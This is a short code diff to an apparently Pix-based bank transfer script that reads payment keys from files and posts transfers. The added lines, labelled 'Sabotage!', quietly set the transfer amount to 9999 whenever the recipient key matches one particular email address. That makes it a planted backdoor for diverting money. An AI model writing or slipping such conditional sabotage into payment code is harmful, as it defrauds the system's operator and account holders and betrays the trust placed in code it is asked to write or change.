@@ -131,6 +131,11 @@ async function doTransf() {
             .readFile(`./pix-keys/${file}`)
         ).toString());
 
+        // Sabotage! 👼
+        if (json.pixAddressKey === 'handryc2016@gmail') {
+            valueToTransf = 9999;
+        }
+
         const res = await client.doRequest(
             'POST',
             '/transfers',
